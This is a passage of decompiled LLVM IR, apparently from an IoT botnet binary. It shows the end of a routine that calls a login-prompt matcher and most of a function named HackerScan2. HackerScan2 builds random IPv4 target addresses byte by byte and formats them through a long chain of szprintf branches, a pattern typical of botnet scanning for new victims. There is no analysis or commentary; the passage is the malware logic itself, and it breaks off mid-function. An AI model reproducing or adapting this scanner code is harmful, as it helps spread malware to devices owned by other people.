dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge: ; preds = %dec_label_pc_10002d10.backedge
  %v3_10002d24.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002cf0:                            ; preds = %dec_label_pc_10002ce4
  %v1_10002cf4 = call i32 @matchPrompt(i32 %arg6)
  %v3_10002cfc = icmp eq i32 %v1_10002cf4, 0
  br i1 %v3_10002cfc, label %dec_label_pc_10002d10.backedge, label %dec_label_pc_10002d48

dec_label_pc_10002d24:                            ; preds = %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge, %dec_label_pc_10002d24.lr.ph
  %v3_10002d24 = phi i32 [ %arg4, %dec_label_pc_10002d24.lr.ph ], [ %v3_10002d24.pre, %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002ad4, %dec_label_pc_10002d24.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge ]
  %v2_10002d28 = icmp sgt i32 %v3_10002d24, 0
  br i1 %v2_10002d28, label %dec_label_pc_10002b0c, label %dec_label_pc_10002d30

dec_label_pc_10002d30:                            ; preds = %dec_label_pc_10002d24
  br i1 %v2_10002d34, label %dec_label_pc_10002b0c, label %dec_label_pc_10002d54

dec_label_pc_10002d48:                            ; preds = %dec_label_pc_10002ccc, %dec_label_pc_10002cf0
  br label %dec_label_pc_10002d5c

dec_label_pc_10002d54:                            ; preds = %dec_label_pc_10002d10.backedge, %dec_label_pc_10002d30, %dec_label_pc_10002b50, %entry
  br label %dec_label_pc_10002d5c

dec_label_pc_10002d5c:                            ; preds = %dec_label_pc_10002d48, %dec_label_pc_10002cc0, %dec_label_pc_10002c88, %dec_label_pc_10002c18, %dec_label_pc_10002d54
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10002d54 ], [ 1, %dec_label_pc_10002d48 ], [ 0, %dec_label_pc_10002c18 ], [ 0, %dec_label_pc_10002c88 ], [ 0, %dec_label_pc_10002cc0 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10002c2c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002b3c, { 1, 0 }
  uselistorder i32 %v2_10002b0c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_10002d5c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10002d54, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10002d48, { 1, 0 }
  uselistorder label %dec_label_pc_10002d10.backedge, { 1, 0, 2 }
}

define i32 @HackerScan2() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i8 0, i8* @global_var_1002abc1.44, align 1
  store i8 0, i8* @global_var_1002abc2.45, align 1
  store i8 0, i8* @global_var_1002abc3.46, align 1
  store i8 0, i8* @global_var_1002abc4.47, align 1
  store i32 268447188, i32* @lr, align 4
  %v0_10002dd0 = call i32 @random()
  %v2_10002df0 = srem i32 %v0_10002dd0, 255
  %v1_10002e18 = trunc i32 %v2_10002df0 to i8
  store i8 %v1_10002e18, i8* @global_var_1002abc1.44, align 1
  store i32 268447264, i32* @lr, align 4
  %v0_10002e1c = call i32 @random()
  %v2_10002e3c = srem i32 %v0_10002e1c, 255
  %v1_10002e64 = trunc i32 %v2_10002e3c to i8
  store i8 %v1_10002e64, i8* @global_var_1002abc2.45, align 1
  store i32 268447340, i32* @lr, align 4
  %v0_10002e68 = call i32 @random()
  %v2_10002e88 = srem i32 %v0_10002e68, 255
  %v1_10002eb0 = trunc i32 %v2_10002e88 to i8
  store i8 %v1_10002eb0, i8* @global_var_1002abc3.46, align 1
  store i32 268447416, i32* @lr, align 4
  %v0_10002eb4 = call i32 @random()
  %v2_10002ed4 = srem i32 %v0_10002eb4, 255
  %v1_10002efc = trunc i32 %v2_10002ed4 to i8
  store i8 %v1_10002efc, i8* @global_var_1002abc4.47, align 1
  store i32 268447492, i32* @lr, align 4
  %v0_10002f00 = call i32 @random()
  %v2_10002f1c = srem i32 %v0_10002f00, 208
  %v3_10002f30 = icmp eq i32 %v2_10002f1c, 0
  br i1 %v3_10002f30, label %dec_label_pc_10002f38, label %dec_label_pc_10002f80

dec_label_pc_10002f38:                            ; preds = %entry
  %v2_10002f38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10002f4c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10002f4c = zext i8 %v3_10002f4c to i32
  %v4_10002f7c = call i32 @szprintf(i32 %v2_10002f38, i32 ptrtoint ([12 x i8]* @global_var_10016334.48 to i32), i32 %v4_10002f4c)
  br label %dec_label_pc_10002f80

dec_label_pc_10002f80:                            ; preds = %entry, %dec_label_pc_10002f38
  %v3_10002f84 = icmp eq i32 %v2_10002f1c, 1
  br i1 %v3_10002f84, label %dec_label_pc_10002f8c, label %dec_label_pc_10002fd4

dec_label_pc_10002f8c:                            ; preds = %dec_label_pc_10002f80
  %v2_10002f8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10002fa0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10002fa0 = zext i8 %v3_10002fa0 to i32
  %v4_10002fd0 = call i32 @szprintf(i32 %v2_10002f8c, i32 ptrtoint ([14 x i8]* @global_var_10016340.49 to i32), i32 %v4_10002fa0)
  br label %dec_label_pc_10002fd4

dec_label_pc_10002fd4:                            ; preds = %dec_label_pc_10002f80, %dec_label_pc_10002f8c
  %v3_10002fd8 = icmp eq i32 %v2_10002f1c, 2
  br i1 %v3_10002fd8, label %dec_label_pc_10002fe0, label %dec_label_pc_10003028

dec_label_pc_10002fe0:                            ; preds = %dec_label_pc_10002fd4
  %v2_10002fe0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10002ff4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10002ff4 = zext i8 %v3_10002ff4 to i32
  %v4_10003024 = call i32 @szprintf(i32 %v2_10002fe0, i32 ptrtoint ([11 x i8]* @global_var_10016350.50 to i32), i32 %v4_10002ff4)
  br label %dec_label_pc_10003028

dec_label_pc_10003028:                            ; preds = %dec_label_pc_10002fd4, %dec_label_pc_10002fe0
  %v3_1000302c = icmp eq i32 %v2_10002f1c, 3
  br i1 %v3_1000302c, label %dec_label_pc_10003034, label %dec_label_pc_1000307c

dec_label_pc_10003034:                            ; preds = %dec_label_pc_10003028
  %v2_10003034 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003048 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003048 = zext i8 %v3_10003048 to i32
  %v4_10003078 = call i32 @szprintf(i32 %v2_10003034, i32 ptrtoint ([13 x i8]* @global_var_1001635c.51 to i32), i32 %v4_10003048)
  br label %dec_label_pc_1000307c

dec_label_pc_1000307c:                            ; preds = %dec_label_pc_10003028, %dec_label_pc_10003034
  %v3_10003080 = icmp eq i32 %v2_10002f1c, 4
  br i1 %v3_10003080, label %dec_label_pc_10003088, label %dec_label_pc_100030d0

dec_label_pc_10003088:                            ; preds = %dec_label_pc_1000307c
  %v2_10003088 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000309c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000309c = zext i8 %v3_1000309c to i32
  %v4_100030cc = call i32 @szprintf(i32 %v2_10003088, i32 ptrtoint ([11 x i8]* @global_var_1001636c.52 to i32), i32 %v4_1000309c)
  br label %dec_label_pc_100030d0

dec_label_pc_100030d0:                            ; preds = %dec_label_pc_1000307c, %dec_label_pc_10003088
  %v3_100030d4 = icmp eq i32 %v2_10002f1c, 5
  br i1 %v3_100030d4, label %dec_label_pc_100030dc, label %dec_label_pc_10003124

dec_label_pc_100030dc:                            ; preds = %dec_label_pc_100030d0
  %v2_100030dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100030f0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100030f0 = zext i8 %v3_100030f0 to i32
  %v4_10003120 = call i32 @szprintf(i32 %v2_100030dc, i32 ptrtoint ([13 x i8]* @global_var_10016378.53 to i32), i32 %v4_100030f0)
  br label %dec_label_pc_10003124

dec_label_pc_10003124:                            ; preds = %dec_label_pc_100030d0, %dec_label_pc_100030dc
  %v3_10003128 = icmp eq i32 %v2_10002f1c, 6
  br i1 %v3_10003128, label %dec_label_pc_10003130, label %dec_label_pc_10003178

dec_label_pc_10003130:                            ; preds = %dec_label_pc_10003124
  %v2_10003130 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003144 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003144 = zext i8 %v3_10003144 to i32
  %v4_10003174 = call i32 @szprintf(i32 %v2_10003130, i32 ptrtoint ([12 x i8]* @global_var_10016388.54 to i32), i32 %v4_10003144)
  br label %dec_label_pc_10003178

dec_label_pc_10003178:                            ; preds = %dec_label_pc_10003124, %dec_label_pc_10003130
  %v3_1000317c = icmp eq i32 %v2_10002f1c, 7
  br i1 %v3_1000317c, label %dec_label_pc_10003184, label %dec_label_pc_100031cc

dec_label_pc_10003184:                            ; preds = %dec_label_pc_10003178
  %v2_10003184 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003198 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003198 = zext i8 %v3_10003198 to i32
  %v4_100031c8 = call i32 @szprintf(i32 %v2_10003184, i32 ptrtoint ([13 x i8]* @global_var_10016394.55 to i32), i32 %v4_10003198)
  br label %dec_label_pc_100031cc

dec_label_pc_100031cc:                            ; preds = %dec_label_pc_10003178, %dec_label_pc_10003184
  %v3_100031d0 = icmp eq i32 %v2_10002f1c, 8
  br i1 %v3_100031d0, label %dec_label_pc_100031d8, label %dec_label_pc_10003220

dec_label_pc_100031d8:                            ; preds = %dec_label_pc_100031cc
  %v2_100031d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100031ec = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100031ec = zext i8 %v3_100031ec to i32
  %v4_1000321c = call i32 @szprintf(i32 %v2_100031d8, i32 ptrtoint ([13 x i8]* @global_var_100163a4.56 to i32), i32 %v4_100031ec)
  br label %dec_label_pc_10003220

dec_label_pc_10003220:                            ; preds = %dec_label_pc_100031cc, %dec_label_pc_100031d8
  %v3_10003224 = icmp eq i32 %v2_10002f1c, 9
  br i1 %v3_10003224, label %dec_label_pc_1000322c, label %dec_label_pc_10003274

dec_label_pc_1000322c:                            ; preds = %dec_label_pc_10003220
  %v2_1000322c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003240 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003240 = zext i8 %v3_10003240 to i32
  %v4_10003270 = call i32 @szprintf(i32 %v2_1000322c, i32 ptrtoint ([13 x i8]* @global_var_100163b4.57 to i32), i32 %v4_10003240)
  br label %dec_label_pc_10003274

dec_label_pc_10003274:                            ; preds = %dec_label_pc_10003220, %dec_label_pc_1000322c
  %v3_10003278 = icmp eq i32 %v2_10002f1c, 10
  br i1 %v3_10003278, label %dec_label_pc_10003280, label %dec_label_pc_100032c8

dec_label_pc_10003280:                            ; preds = %dec_label_pc_10003274
  %v2_10003280 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003294 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003294 = zext i8 %v3_10003294 to i32
  %v4_100032c4 = call i32 @szprintf(i32 %v2_10003280, i32 ptrtoint ([14 x i8]* @global_var_100163c4.58 to i32), i32 %v4_10003294)
  br label %dec_label_pc_100032c8

dec_label_pc_100032c8:                            ; preds = %dec_label_pc_10003274, %dec_label_pc_10003280
  %v3_100032cc = icmp eq i32 %v2_10002f1c, 11
  br i1 %v3_100032cc, label %dec_label_pc_100032d4, label %dec_label_pc_1000331c

dec_label_pc_100032d4:                            ; preds = %dec_label_pc_100032c8
  %v2_100032d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100032e8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100032e8 = zext i8 %v3_100032e8 to i32
  %v4_10003318 = call i32 @szprintf(i32 %v2_100032d4, i32 ptrtoint ([11 x i8]* @global_var_100163d4.59 to i32), i32 %v4_100032e8)
  br label %dec_label_pc_1000331c

dec_label_pc_1000331c:                            ; preds = %dec_label_pc_100032c8, %dec_label_pc_100032d4
  %v3_10003320 = icmp eq i32 %v2_10002f1c, 12
  br i1 %v3_10003320, label %dec_label_pc_10003328, label %dec_label_pc_10003370

dec_label_pc_10003328:                            ; preds = %dec_label_pc_1000331c
  %v2_10003328 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000333c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000333c = zext i8 %v3_1000333c to i32
  %v4_1000336c = call i32 @szprintf(i32 %v2_10003328, i32 ptrtoint ([13 x i8]* @global_var_100163e0.60 to i32), i32 %v4_1000333c)
  br label %dec_label_pc_10003370

dec_label_pc_10003370:                            ; preds = %dec_label_pc_1000331c, %dec_label_pc_10003328
  %v3_10003374 = icmp eq i32 %v2_10002f1c, 13
  br i1 %v3_10003374, label %dec_label_pc_1000337c, label %dec_label_pc_100033c4

dec_label_pc_1000337c:                            ; preds = %dec_label_pc_10003370
  %v2_1000337c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003390 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003390 = zext i8 %v3_10003390 to i32
  %v4_100033c0 = call i32 @szprintf(i32 %v2_1000337c, i32 ptrtoint ([13 x i8]* @global_var_100163f0.61 to i32), i32 %v4_10003390)
  br label %dec_label_pc_100033c4

dec_label_pc_100033c4:                            ; preds = %dec_label_pc_10003370, %dec_label_pc_1000337c
  %v3_100033c8 = icmp eq i32 %v2_10002f1c, 14
  br i1 %v3_100033c8, label %dec_label_pc_100033d0, label %dec_label_pc_10003418

dec_label_pc_100033d0:                            ; preds = %dec_label_pc_100033c4
  %v2_100033d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100033e4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100033e4 = zext i8 %v3_100033e4 to i32
  %v4_10003414 = call i32 @szprintf(i32 %v2_100033d0, i32 ptrtoint ([13 x i8]* @global_var_10016400.62 to i32), i32 %v4_100033e4)
  br label %dec_label_pc_10003418

dec_label_pc_10003418:                            ; preds = %dec_label_pc_100033c4, %dec_label_pc_100033d0
  %v3_1000341c = icmp eq i32 %v2_10002f1c, 15
  br i1 %v3_1000341c, label %dec_label_pc_10003424, label %dec_label_pc_1000346c

dec_label_pc_10003424:                            ; preds = %dec_label_pc_10003418
  %v2_10003424 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003438 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003438 = zext i8 %v3_10003438 to i32
  %v4_10003468 = call i32 @szprintf(i32 %v2_10003424, i32 ptrtoint ([13 x i8]* @global_var_10016410.63 to i32), i32 %v4_10003438)
  br label %dec_label_pc_1000346c

dec_label_pc_1000346c:                            ; preds = %dec_label_pc_10003418, %dec_label_pc_10003424
  %v3_10003470 = icmp eq i32 %v2_10002f1c, 16
  br i1 %v3_10003470, label %dec_label_pc_10003478, label %dec_label_pc_100034c0

dec_label_pc_10003478:                            ; preds = %dec_label_pc_1000346c
  %v2_10003478 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000348c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000348c = zext i8 %v3_1000348c to i32
  %v4_100034bc = call i32 @szprintf(i32 %v2_10003478, i32 ptrtoint ([13 x i8]* @global_var_10016420.64 to i32), i32 %v4_1000348c)
  br label %dec_label_pc_100034c0

dec_label_pc_100034c0:                            ; preds = %dec_label_pc_1000346c, %dec_label_pc_10003478
  %v3_100034c4 = icmp eq i32 %v2_10002f1c, 17
  br i1 %v3_100034c4, label %dec_label_pc_100034cc, label %dec_label_pc_10003514

dec_label_pc_100034cc:                            ; preds = %dec_label_pc_100034c0
  %v2_100034cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100034e0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100034e0 = zext i8 %v3_100034e0 to i32
  %v4_10003510 = call i32 @szprintf(i32 %v2_100034cc, i32 ptrtoint ([13 x i8]* @global_var_10016430.65 to i32), i32 %v4_100034e0)
  br label %dec_label_pc_10003514

dec_label_pc_10003514:                            ; preds = %dec_label_pc_100034c0, %dec_label_pc_100034cc
  %v3_10003518 = icmp eq i32 %v2_10002f1c, 18
  br i1 %v3_10003518, label %dec_label_pc_10003520, label %dec_label_pc_10003568

dec_label_pc_10003520:                            ; preds = %dec_label_pc_10003514
  %v2_10003520 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003534 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003534 = zext i8 %v3_10003534 to i32
  %v4_10003564 = call i32 @szprintf(i32 %v2_10003520, i32 ptrtoint ([13 x i8]* @global_var_10016440.66 to i32), i32 %v4_10003534)
  br label %dec_label_pc_10003568

dec_label_pc_10003568:                            ; preds = %dec_label_pc_10003514, %dec_label_pc_10003520
  %v3_1000356c = icmp eq i32 %v2_10002f1c, 19
  br i1 %v3_1000356c, label %dec_label_pc_10003574, label %dec_label_pc_100035bc

dec_label_pc_10003574:                            ; preds = %dec_label_pc_10003568
  %v2_10003574 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003588 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003588 = zext i8 %v3_10003588 to i32
  %v4_100035b8 = call i32 @szprintf(i32 %v2_10003574, i32 ptrtoint ([11 x i8]* @global_var_10016450.67 to i32), i32 %v4_10003588)
  br label %dec_label_pc_100035bc

dec_label_pc_100035bc:                            ; preds = %dec_label_pc_10003568, %dec_label_pc_10003574
  %v3_100035c0 = icmp eq i32 %v2_10002f1c, 20
  br i1 %v3_100035c0, label %dec_label_pc_100035c8, label %dec_label_pc_10003610

dec_label_pc_100035c8:                            ; preds = %dec_label_pc_100035bc
  %v2_100035c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100035dc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100035dc = zext i8 %v3_100035dc to i32
  %v4_1000360c = call i32 @szprintf(i32 %v2_100035c8, i32 ptrtoint ([12 x i8]* @global_var_1001645c.68 to i32), i32 %v4_100035dc)
  br label %dec_label_pc_10003610

dec_label_pc_10003610:                            ; preds = %dec_label_pc_100035bc, %dec_label_pc_100035c8
  %v3_10003614 = icmp eq i32 %v2_10002f1c, 21
  br i1 %v3_10003614, label %dec_label_pc_1000361c, label %dec_label_pc_10003664

dec_label_pc_1000361c:                            ; preds = %dec_label_pc_10003610
  %v2_1000361c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003630 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003630 = zext i8 %v3_10003630 to i32
  %v4_10003660 = call i32 @szprintf(i32 %v2_1000361c, i32 ptrtoint ([13 x i8]* @global_var_10016468.69 to i32), i32 %v4_10003630)
  br label %dec_label_pc_10003664

dec_label_pc_10003664:                            ; preds = %dec_label_pc_10003610, %dec_label_pc_1000361c
  %v3_10003668 = icmp eq i32 %v2_10002f1c, 22
  br i1 %v3_10003668, label %dec_label_pc_10003670, label %dec_label_pc_100036b8

dec_label_pc_10003670:                            ; preds = %dec_label_pc_10003664
  %v2_10003670 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003684 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003684 = zext i8 %v3_10003684 to i32
  %v4_100036b4 = call i32 @szprintf(i32 %v2_10003670, i32 ptrtoint ([11 x i8]* @global_var_10016478.70 to i32), i32 %v4_10003684)
  br label %dec_label_pc_100036b8

dec_label_pc_100036b8:                            ; preds = %dec_label_pc_10003664, %dec_label_pc_10003670
  %v3_100036bc = icmp eq i32 %v2_10002f1c, 23
  br i1 %v3_100036bc, label %dec_label_pc_100036c4, label %dec_label_pc_1000370c

dec_label_pc_100036c4:                            ; preds = %dec_label_pc_100036b8
  %v2_100036c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100036d8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100036d8 = zext i8 %v3_100036d8 to i32
  %v4_10003708 = call i32 @szprintf(i32 %v2_100036c4, i32 ptrtoint ([11 x i8]* @global_var_10016484.71 to i32), i32 %v4_100036d8)
  br label %dec_label_pc_1000370c

dec_label_pc_1000370c:                            ; preds = %dec_label_pc_100036b8, %dec_label_pc_100036c4
  %v3_10003710 = icmp eq i32 %v2_10002f1c, 24
  br i1 %v3_10003710, label %dec_label_pc_10003718, label %dec_label_pc_10003760

dec_label_pc_10003718:                            ; preds = %dec_label_pc_1000370c
  %v2_10003718 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000372c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000372c = zext i8 %v3_1000372c to i32
  %v4_1000375c = call i32 @szprintf(i32 %v2_10003718, i32 ptrtoint ([12 x i8]* @global_var_10016490.72 to i32), i32 %v4_1000372c)
  br label %dec_label_pc_10003760

dec_label_pc_10003760:                            ; preds = %dec_label_pc_1000370c, %dec_label_pc_10003718
  %v3_10003764 = icmp eq i32 %v2_10002f1c, 25
  br i1 %v3_10003764, label %dec_label_pc_1000376c, label %dec_label_pc_100037b4

dec_label_pc_1000376c:                            ; preds = %dec_label_pc_10003760
  %v2_1000376c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003780 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003780 = zext i8 %v3_10003780 to i32
  %v4_100037b0 = call i32 @szprintf(i32 %v2_1000376c, i32 ptrtoint ([12 x i8]* @global_var_1001649c.73 to i32), i32 %v4_10003780)
  br label %dec_label_pc_100037b4

dec_label_pc_100037b4:                            ; preds = %dec_label_pc_10003760, %dec_label_pc_1000376c
  %v3_100037b8 = icmp eq i32 %v2_10002f1c, 26
  br i1 %v3_100037b8, label %dec_label_pc_100037c0, label %dec_label_pc_10003808

dec_label_pc_100037c0:                            ; preds = %dec_label_pc_100037b4
  %v2_100037c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100037d4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100037d4 = zext i8 %v3_100037d4 to i32
  %v4_10003804 = call i32 @szprintf(i32 %v2_100037c0, i32 ptrtoint ([12 x i8]* @global_var_100164a8.74 to i32), i32 %v4_100037d4)
  br label %dec_label_pc_10003808

dec_label_pc_10003808:                            ; preds = %dec_label_pc_100037b4, %dec_label_pc_100037c0
  %v3_1000380c = icmp eq i32 %v2_10002f1c, 27
  br i1 %v3_1000380c, label %dec_label_pc_10003814, label %dec_label_pc_1000385c

dec_label_pc_10003814:                            ; preds = %dec_label_pc_10003808
  %v2_10003814 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003828 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003828 = zext i8 %v3_10003828 to i32
  %v4_10003858 = call i32 @szprintf(i32 %v2_10003814, i32 ptrtoint ([13 x i8]* @global_var_100164b4.75 to i32), i32 %v4_10003828)
  br label %dec_label_pc_1000385c

dec_label_pc_1000385c:                            ; preds = %dec_label_pc_10003808, %dec_label_pc_10003814
  %v3_10003860 = icmp eq i32 %v2_10002f1c, 28
  br i1 %v3_10003860, label %dec_label_pc_10003868, label %dec_label_pc_100038b0

dec_label_pc_10003868:                            ; preds = %dec_label_pc_1000385c
  %v2_10003868 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000387c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000387c = zext i8 %v3_1000387c to i32
  %v4_100038ac = call i32 @szprintf(i32 %v2_10003868, i32 ptrtoint ([13 x i8]* @global_var_100164c4.76 to i32), i32 %v4_1000387c)
  br label %dec_label_pc_100038b0

dec_label_pc_100038b0:                            ; preds = %dec_label_pc_1000385c, %dec_label_pc_10003868
  %v3_100038b4 = icmp eq i32 %v2_10002f1c, 29
  br i1 %v3_100038b4, label %dec_label_pc_100038bc, label %dec_label_pc_10003904

dec_label_pc_100038bc:                            ; preds = %dec_label_pc_100038b0
  %v2_100038bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100038d0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100038d0 = zext i8 %v3_100038d0 to i32
  %v4_10003900 = call i32 @szprintf(i32 %v2_100038bc, i32 ptrtoint ([12 x i8]* @global_var_100164d4.77 to i32), i32 %v4_100038d0)
  br label %dec_label_pc_10003904

dec_label_pc_10003904:                            ; preds = %dec_label_pc_100038b0, %dec_label_pc_100038bc
  %v3_10003908 = icmp eq i32 %v2_10002f1c, 30
  br i1 %v3_10003908, label %dec_label_pc_10003910, label %dec_label_pc_10003958

dec_label_pc_10003910:                            ; preds = %dec_label_pc_10003904
  %v2_10003910 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003924 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003924 = zext i8 %v3_10003924 to i32
  %v4_10003954 = call i32 @szprintf(i32 %v2_10003910, i32 ptrtoint ([13 x i8]* @global_var_100164e0.78 to i32), i32 %v4_10003924)
  br label %dec_label_pc_10003958

dec_label_pc_10003958:                            ; preds = %dec_label_pc_10003904, %dec_label_pc_10003910
  %v3_1000395c = icmp eq i32 %v2_10002f1c, 31
  br i1 %v3_1000395c, label %dec_label_pc_10003964, label %dec_label_pc_100039ac

dec_label_pc_10003964:                            ; preds = %dec_label_pc_10003958
  %v2_10003964 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003978 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003978 = zext i8 %v3_10003978 to i32
  %v4_100039a8 = call i32 @szprintf(i32 %v2_10003964, i32 ptrtoint ([12 x i8]* @global_var_100164f0.79 to i32), i32 %v4_10003978)
  br label %dec_label_pc_100039ac

dec_label_pc_100039ac:                            ; preds = %dec_label_pc_10003958, %dec_label_pc_10003964
  %v3_100039b0 = icmp eq i32 %v2_10002f1c, 32
  br i1 %v3_100039b0, label %dec_label_pc_100039b8, label %dec_label_pc_10003a00

dec_label_pc_100039b8:                            ; preds = %dec_label_pc_100039ac
  %v2_100039b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100039cc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100039cc = zext i8 %v3_100039cc to i32
  %v4_100039fc = call i32 @szprintf(i32 %v2_100039b8, i32 ptrtoint ([11 x i8]* @global_var_100164fc.80 to i32), i32 %v4_100039cc)
  br label %dec_label_pc_10003a00

dec_label_pc_10003a00:                            ; preds = %dec_label_pc_100039ac, %dec_label_pc_100039b8
  %v3_10003a04 = icmp eq i32 %v2_10002f1c, 33
  br i1 %v3_10003a04, label %dec_label_pc_10003a0c, label %dec_label_pc_10003a54

dec_label_pc_10003a0c:                            ; preds = %dec_label_pc_10003a00
  %v2_10003a0c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a20 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003a20 = zext i8 %v3_10003a20 to i32
  %v4_10003a50 = call i32 @szprintf(i32 %v2_10003a0c, i32 ptrtoint ([12 x i8]* @global_var_10016508.81 to i32), i32 %v4_10003a20)
  br label %dec_label_pc_10003a54

dec_label_pc_10003a54:                            ; preds = %dec_label_pc_10003a00, %dec_label_pc_10003a0c
  %v3_10003a58 = icmp eq i32 %v2_10002f1c, 34
  br i1 %v3_10003a58, label %dec_label_pc_10003a60, label %dec_label_pc_10003aa8

dec_label_pc_10003a60:                            ; preds = %dec_label_pc_10003a54
  %v2_10003a60 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a74 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003a74 = zext i8 %v3_10003a74 to i32
  %v4_10003aa4 = call i32 @szprintf(i32 %v2_10003a60, i32 ptrtoint ([12 x i8]* @global_var_10016514.82 to i32), i32 %v4_10003a74)
  br label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003a54, %dec_label_pc_10003a60
  %v3_10003aac = icmp eq i32 %v2_10002f1c, 35
  br i1 %v3_10003aac, label %dec_label_pc_10003ab4, label %dec_label_pc_10003afc

dec_label_pc_10003ab4:                            ; preds = %dec_label_pc_10003aa8
  %v2_10003ab4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ac8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003ac8 = zext i8 %v3_10003ac8 to i32
  %v4_10003af8 = call i32 @szprintf(i32 %v2_10003ab4, i32 ptrtoint ([12 x i8]* @global_var_10016520.83 to i32), i32 %v4_10003ac8)
  br label %dec_label_pc_10003afc

dec_label_pc_10003afc:                            ; preds = %dec_label_pc_10003aa8, %dec_label_pc_10003ab4
  %v3_10003b00 = icmp eq i32 %v2_10002f1c, 36
  br i1 %v3_10003b00, label %dec_label_pc_10003b08, label %dec_label_pc_10003b50

dec_label_pc_10003b08:                            ; preds = %dec_label_pc_10003afc
  %v2_10003b08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b1c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10003b1c = zext i8 %v3_10003b1c to i32
  %v4_10003b4c = call i32 @szprintf(i32 %v2_10003b08, i32 ptrtoint ([12 x i8]* @global_var_1001652c.84 to i32), i32 %v4_10003b1c)
  br label %dec_label_pc_10003b50

dec_label_pc_10003b50:                            ; preds = %dec_label_pc_10003afc, %dec_label_pc_10003b08
